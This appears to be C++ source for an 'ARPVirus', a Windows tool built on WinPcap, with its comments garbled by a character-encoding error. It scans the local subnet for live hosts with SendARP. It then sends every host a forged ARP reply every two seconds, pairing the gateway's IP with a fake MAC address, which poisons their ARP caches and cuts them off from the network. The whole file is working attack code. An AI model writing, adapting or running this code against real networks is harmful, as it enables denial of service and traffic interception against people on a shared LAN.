// ARPVirus.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "global.h"
#include "IPHeaders.h"

int init_info();
void enum_host();
DWORD WINAPI scan_lan(LPVOID lparam);
void delete_localip_in_hostList();
void init_arp();
void init_host_arp();
void read_ip();

int lib_main()
{
	int nRet = 0;
	nRet = init_info();
	if(nRet)
		return nRet;

	enum_host();
    delete_localip_in_hostList();
	if(hostList.size() == 0)
		return -1;
    printf("%s\n","����ɨ����������......");
	Sleep(2*1000);
    printf("��ǰ���ߵ���������%d\n",hostList.size());
	printf("%s\n","����ʹ������������������......��ctrl+z���˳�");
	//init_arp();
	init_host_arp();

	while(true)
	{
		std::list< PLAN_HOST_INFO >::iterator iter = hostList.begin();
		while(iter != hostList.end())
		{
			arp.DestinationIP = inet_addr((*iter)->IpAddr);
			memcpy(arp.DestinationMAC, (*iter)->ucMacAddr, 6);
			memcpy(&sendBuffer[14], &arp, 28);
			pcap_sendpacket(pfp, sendBuffer, 14+28);
			iter++;
		}
		Sleep(2*1000);
	}
	pcap_close(pfp);
}

int init_info()
{
	//��������б�
	ULONG ulLen = 0;
	::GetAdaptersInfo(pAdapterInfo,&ulLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)::GlobalAlloc(GPTR, ulLen);
	
	if(::GetAdaptersInfo(pAdapterInfo,&ulLen) ==  ERROR_SUCCESS)
    {
        char adaptername[100];
        pOrgAdapterInfo = pAdapterInfo;
        while(pAdapterInfo != NULL)
        {
            strcpy(adaptername,"\\Device\\NPF_");
            strcat(adaptername,pAdapterInfo->AdapterName);
            strcpy(pAdapterInfo->AdapterName,adaptername);
            pAdapterInfo = pAdapterInfo->Next;
        }
    }
	
	//��û����
	while(pOrgAdapterInfo != NULL)
	{
		pfp = pcap_open_live( pOrgAdapterInfo->AdapterName ,  100, 0, 1, error );
		ULONG macAddLen=6;
		//�����������������������ȷ�������أ����ж�Ϊ�����
		if(pfp != NULL && (SendARP(inet_addr((char*)pOrgAdapterInfo->GatewayList.IpAddress.String), (IPAddr) NULL,(PULONG) gatewaymac, &macAddLen) == NO_ERROR))
			break;
		else
			pOrgAdapterInfo = pOrgAdapterInfo->Next;
	}

	//û������Ҫ���������˵�������������������������˳���
	if(pOrgAdapterInfo == NULL)
		return -1;
    //��������ȡ����������Ϣ��gatewaymac�������SendARP�ѻ�á�
	localip.append((char*)pOrgAdapterInfo->IpAddressList.IpAddress.String);
	netmask.append((char*)pOrgAdapterInfo->IpAddressList.IpMask.String);
	gatewayip.append((char*)pOrgAdapterInfo->GatewayList.IpAddress.String);
	ULONG macLen=6;
	if(!(SendARP(inet_addr((char*)pOrgAdapterInfo->IpAddressList.IpAddress.String), (IPAddr) NULL,(PULONG) localmac, &macLen) == NO_ERROR))
		return -2;

	return 0;
}

void enum_host()
{
	unsigned int uHostNum;//�����ڿɻ��ֵ���������
	unsigned int uHostByte; //����λ

	uHostNum = ~ htonl(inet_addr(netmask.data())) - 1;//����������õ������ڵ����������������������� = ~ MASK - 1
	uHostByte = htonl(inet_addr(gatewayip.data())) & 0xffffff00;// ��IP��ַ�õ�����λ
	
	if (uHostNum > 2000)//��ֹ������Ϊ255.0.0.0֮���
		uHostNum = 2000;

	// ������ʱ����,���IP��MAC
	char TempIpAddr[4 * 4];
	char MACAddr[40];
    
	//�߳̾�������2000��
	HANDLE hThread[2001]; 

	int i;
	for (i = 0, uHostByte++; i < uHostNum; i++, uHostByte++)
	{
		// ����IP��ַ
		memset(TempIpAddr, 0, 16);
		sprintf(TempIpAddr, "%d.%d.%d.%d", 
			(uHostByte & 0xff000000) >> 0x18,//ȡ��IPλ������24λ
			(uHostByte & 0x00ff0000) >> 0x10,//ȡ��IPλ������16λ
			(uHostByte & 0x0000ff00) >> 0x08,//ȡ��IPλ������8λ
			(uHostByte & 0x000000ff));//ȡ�����һ��IPλ����ʼΪ0���Ժ�ÿ�μ�1
		//��ʱ�����������Ϣ��������Ҫ̽���IP
		PLAN_HOST_INFO tempHostInfo = new LAN_HOST_INFO;
		memset(tempHostInfo, 0, sizeof(LAN_HOST_INFO));
		memcpy(tempHostInfo->IpAddr, TempIpAddr, sizeof(TempIpAddr));
		//��tempHostInfo����scan_lan����̽�����Ƿ�����
		DWORD ThreadId;
		hThread[i] = CreateThread(NULL,0,scan_lan,tempHostInfo,0,&ThreadId);
	}
    //�ȴ������̷߳��أ�ע�⣬���ֻ�ܵȴ�64����
	WaitForMultipleObjects(MAXIMUM_WAIT_OBJECTS,hThread,TRUE,INFINITE);
}

DWORD WINAPI scan_lan(LPVOID lparam)
{
	int flag;
	//��ô�ֵ�����Ĵ�ɨ��������Ϣ
	PLAN_HOST_INFO HostInfo = (PLAN_HOST_INFO)lparam;
	char IpAddr[16];
	unsigned char ucMacAddr[6];
	memcpy(IpAddr, HostInfo->IpAddr, sizeof(IpAddr));
	ULONG macLen=6;
	memset(ucMacAddr, 0xff, sizeof(ucMacAddr));
	//����ARP̽���Ƿ����ߣ�������MAC��ַ
	if (SendARP(inet_addr(IpAddr), (IPAddr) NULL,(PULONG) ucMacAddr, &macLen) == NO_ERROR)
		flag = 1;
	else
		flag =0;

	//������������������ȫ�ֱ���hostList��
	if(flag)
	{
		memcpy(HostInfo->ucMacAddr, ucMacAddr, sizeof(ucMacAddr));
		mutex.Lock();
		hostList.push_back(HostInfo);
		mutex.Unlock();
	}
	else
		delete HostInfo;
	return 0;
}

void delete_localip_in_hostList()
{
	std::list< PLAN_HOST_INFO >::iterator iter = hostList.begin();
	while(iter != hostList.end())
	{
		if(!(strcmp((*iter)->IpAddr, localip.data()))
			|| !(strcmp((*iter)->IpAddr, gatewayip.data())))
		{
			iter = hostList.erase(iter);
			continue; 
		}
		iter++;
	}

}

void init_arp()
{
	memset(&ethernet, 0, sizeof(ethernet));
	BYTE hostmac[8];
	
	
	//��MACΪϹ���
	hostmac[0] = 0x00;
    hostmac[1] = 0x23;
    hostmac[2] = 0x8B;
    hostmac[3] = 0x6A;
    hostmac[4] = 0x44;
    hostmac[5] = 0xB7;
	
	
	memcpy(ethernet.SourMAC, localmac, 6);
    memcpy(ethernet.DestMAC, gatewaymac, 6);
	ethernet.EthType = htons(0x0806);
	memcpy(&sendBuffer, &ethernet, 14);
	
	arp.HardwareType = htons(0x0001);
	arp.ProtocolType = htons(0x0800);
	arp.MACLength = 6;
    arp.IpAddLength = 4;
    arp.OperationCode = htons(0x0002);//ARP REPLY��
	memcpy(arp.SourceMAC, ethernet.SourMAC, 6);
	memcpy(arp.DestinationMAC, ethernet.DestMAC, 6);
	arp.DestinationIP = inet_addr(gatewayip.data());
}

void init_host_arp()
{
	memset(&ethernet, 0, sizeof(ethernet));
	BYTE hostmac[8];
	

	//��MACΪϹ���
	hostmac[0] = 0x00;
    hostmac[1] = 0x23;
    hostmac[2] = 0x8B;
    hostmac[3] = 0x6A;
    hostmac[4] = 0x44;
    hostmac[5] = 0xB7;
	
	
	memcpy(ethernet.SourMAC, hostmac, 6);
    memcpy(ethernet.DestMAC, gatewaymac, 6);
	ethernet.EthType = htons(0x0806);
	memcpy(&sendBuffer, &ethernet, 14);
	
	arp.HardwareType = htons(0x0001);
	arp.ProtocolType = htons(0x0800);
	arp.MACLength = 6;
    arp.IpAddLength = 4;
    arp.OperationCode = htons(0x0002);//ARP REPLY��
	memcpy(arp.SourceMAC, ethernet.SourMAC, 6);
	memcpy(arp.DestinationMAC, ethernet.DestMAC, 6);
	arp.SourceIP = inet_addr(gatewayip.data());
}

void read_ip()
{
	
}